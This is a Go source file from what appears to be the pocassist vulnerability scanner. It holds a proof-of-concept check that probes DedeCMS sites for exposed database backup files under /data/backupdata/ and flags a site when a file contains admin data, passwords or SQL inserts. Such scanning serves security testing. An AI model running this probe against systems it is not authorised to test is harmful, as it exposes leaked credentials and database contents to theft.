package scripts

import (
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
	"strconv"
	"strings"
)

func DedecmsBakeUpFileFound(args *ScriptScanArgs) (*util.ScanResult, error) {

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)
	fastReq.Header.SetMethod(fasthttp.MethodGet)

	// 定义报文列表
	var respList []*proto.Response

	bakFileUriList := []string{
		"/data/backupdata/dede_h~", "/data/backupdata/dede_m~", "/data/backupdata/dede_p~",
		"/data/backupdata/dede_a~", "/data/backupdata/dede_s~"}
	for _, bakUri := range bakFileUriList{
		tmpUrl := ConstructUrl(args, bakUri)
		for i := 1; i < 6; i++ {
			rawUrl := tmpUrl + strconv.Itoa(i) + ".txt"

			fastReq.SetRequestURI(rawUrl)

			resp, err := util.DoFasthttpRequest(fastReq, true)
			if err != nil {
				util.ResponsePut(resp)
				return &util.InVulnerableResult, err
			}
			if resp.Status == 200 {
				respList = append(respList, resp)
				bodyString := string(resp.Body)
				if strings.Contains(bodyString,"admin") ||
					strings.Contains(bodyString,"密码") ||
					strings.Contains(bodyString,"INSERT INTO"){
					return util.VulnerableHttpResult(rawUrl, "", respList),nil
				}
			}
			util.ResponsePut(resp)
		}
	}
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-dedecms-bakfile-disclosure", DedecmsBakeUpFileFound)
}
